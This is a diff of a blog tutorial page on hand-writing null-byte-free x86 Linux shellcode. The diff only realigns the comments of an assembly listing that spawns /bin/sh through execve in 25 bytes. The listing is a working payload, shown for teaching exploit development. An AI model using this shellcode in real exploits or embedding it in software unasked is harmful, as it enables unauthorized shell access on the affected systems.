@@ -82,17 +82,17 @@ root@demoniware:~/shellcode# ./shell
 
 <p>But this code is not nullbyte free and it’s a problem when we are working with shellcodes, so with some work I got this code,</p>
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>xor eax,eax <span class="p">;</span>zero to eax
-push eax <span class="p">;</span>put <span class="m">0</span> in stack, end of string
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>xor eax,eax 		<span class="p">;</span> zero to eax
+push eax 				<span class="p">;</span> put <span class="m">0</span> in stack, end of string
 push 0x68732f6e <span class="p">;</span> part of /bin/sh
 push 0x69622f2f <span class="p">;</span> part of /bin/sh
-mov ebx,esp<span class="p">;</span> mov /bin/sh to ebx
-push eax<span class="p">;</span> put NULL on argv
-push ebx<span class="p">;</span> put filename on stack
-mov ecx, esp<span class="p">;</span> put filename to ecx
-xor edx,edx<span class="p">;</span> <span class="nv">envp</span> <span class="o">=</span> NULL
-mov al,0x0b<span class="p">;</span> 0x0b to call sys_execve
-int 0x80<span class="p">;</span> kernel interrupt</code></pre></figure>
+mov ebx,esp			<span class="p">;</span> mov /bin/sh to ebx
+push eax				<span class="p">;</span> put NULL on argv
+push ebx				<span class="p">;</span> put filename on stack
+mov ecx, esp		<span class="p">;</span> put filename to ecx
+xor edx,edx			<span class="p">;</span> <span class="nv">envp</span> <span class="o">=</span> NULL
+mov al,0x0b			<span class="p">;</span> 0x0b to call sys_execve
+int 0x80				<span class="p">;</span> kernel interrupt</code></pre></figure>
 
 <p>To confirm if my code is free of nullbytes, I used this site <a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank">defuse.ca</a>, that translate asm instructions to opcodes or just use objdump, and now I have a shellcode free of nullbytes with 25 bytes because the shellcode does not need the prologue</p>
 
